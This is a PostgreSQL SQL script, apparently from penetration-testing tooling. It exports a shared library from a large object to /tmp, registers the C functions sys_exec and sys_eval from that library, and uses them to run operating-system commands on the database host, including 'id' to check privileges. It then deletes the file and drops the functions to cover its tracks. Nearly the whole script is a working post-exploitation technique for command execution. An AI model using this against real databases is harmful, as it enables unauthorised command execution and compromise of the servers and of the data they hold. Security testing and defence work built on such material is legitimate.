-- Export the binary UDF OID to a file on the file system
-- 
-- Any folder where postgres user has read/write/execute access is valid
SELECT lo_export(35817, '/tmp/lib_postgresqludf_sys.so'); -- -rw-r--r-- 1 postgres postgres
-- 
-- Notes:
-- If the library file already exists and the postgres user has write
-- access over it, it can overwrite the file
-- The following enumerates the PostgreSQL data directory
-- SELECT CURRENT_SETTING('data_directory')
-- Reference:
-- http://www.postgresql.org/docs/8.3/interactive/functions-admin.html
-- The following will save into /var/lib/postgresql/M.m/main/lib_postgresqludf_sys.so
-- SELECT lo_export(35817, 'lib_postgresqludf_sys.so'); -- -rw-r--r-- 1 postgres postgres
-- The following would save into / (Permission denied)
-- SELECT lo_export(35817, '/lib_postgresqludf_sys.so');


-- Create two functions from the binary UDF file
CREATE OR REPLACE FUNCTION sys_exec(text) RETURNS int4 AS '/tmp/lib_postgresqludf_sys.so', 'sys_exec' LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE;
CREATE OR REPLACE FUNCTION sys_eval(text) RETURNS text AS '/tmp/lib_postgresqludf_sys.so', 'sys_eval' LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE;


-- Test the two functions
SELECT sys_exec('echo test > /tmp/lib_postgresqludf_sys.txt'); -- -rw------- 1 postgres postgres
SELECT sys_eval('cat /tmp/lib_postgresqludf_sys.txt ; id');


-- Cleanup the file system and the database
SELECT sys_exec('rm -f /tmp/lib_postgresqludf_sys.*');
DROP TABLE IF EXISTS udftest;
DROP FUNCTION IF EXISTS sys_exec(text);
DROP FUNCTION IF EXISTS sys_eval(text);
